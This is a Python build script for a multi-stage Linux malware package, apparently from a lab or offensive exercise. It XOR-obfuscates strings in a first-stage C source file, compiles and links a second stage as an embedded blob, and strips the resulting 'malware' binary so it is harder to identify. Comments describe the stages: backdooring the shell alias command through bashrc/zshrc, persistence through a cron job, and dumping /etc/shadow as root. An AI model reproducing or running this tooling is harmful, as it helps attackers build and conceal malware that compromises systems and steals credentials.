#!/usr/bin/python3
import binascii
import shutil
import re
import os

print("This program builds the entire malware and packs it into the initial stage.")

print("Encoding Strings!")

def bytes_to_c_arr(data, lowercase=True):
    return [format(b, '#04x' if lowercase else '#04X') for b in data]


updated_lines = []
lines = []


with open("Stage1.c", "r") as s1_source:
    lines = s1_source.readlines()

    p = re.compile('[A-Z_]{4,}')
    for line in lines:
        if "//#define" in line:
            extracted_name =  p.search(line).group(0)
            # Get starting quote
            ind = line.index('"') + 1

            # get ending quote
            ind_end = line.index('"',ind)

            #print("{} : {}".format(ind ,ind_end))
            chopped = line[ind:ind_end]
            chopped = chopped.replace('\\n', '\n')
            line_len = len(chopped)

            byte_line = chopped.encode()

            encoded_line = bytearray()
            first_part = (line_len).to_bytes(4, byteorder='little')
            for line_byte in first_part:
                encoded_line.append(line_byte)

            for line_byte in byte_line:
                encoded_line.append(line_byte)

            for i in range (4, len(encoded_line)):
                encoded_line[i] = encoded_line[i] ^ encoded_line[0]

            formatted = "".join("\\x%02x" % i for i in encoded_line)
            updated_lines.append("#define {} \"{}\"".format(extracted_name, formatted))
# The build order is:

# Stage 1 - User mode, backdoors the alias command and then sources bashrc/zshrc, placed in /tmp/
# Stage 2 - Escalated runner, this reads the key from host, and then writes it somewhere and adds cron job
# Persistence Payload (this one writes the "OWNED.txt" to the user's desktop as root w/ /etc/shadow contents)

print("Writing out updated file!")


with open("Stage1_processed.c", "w") as processed_file:

    replacing = False
    for line in lines:
        if not replacing and "//START OBFUSCATING" in line:
            print("Starting!")
            replacing = True

            for updated_line in updated_lines:
                processed_file.write(updated_line + '\n')
        elif replacing and "//END OBFUSCATING" in line:
            replacing = False
        else:
            processed_file.write(line)

os.system("gcc -s -O4 Stage2.c -o stage2")
os.system("objcopy -I binary -O elf64-x86-64 stage2 stage2.o")

# TODO Encrypt stage2 

# Build persistence, strip, minify, etc and converto blob, encrypt blob with known key (first line of shadow)
# Build stage 2, link with blob, strip, minify, etc
# Stage 1 - pack nested payloads

os.system("gcc -Wall -fPIC -Wextra -s -O4 -funroll-loops -c Stage1_processed.c -o malware.o")
os.system("gcc -static malware.o stage2.o -o malware")

os.system("strip -R .comment malware")
os.system("strip -R .note.gnu.property malware")
os.system("strip -R .note.gnu.build-id malware")
os.system("strip -R .note.ABI-tag malware")
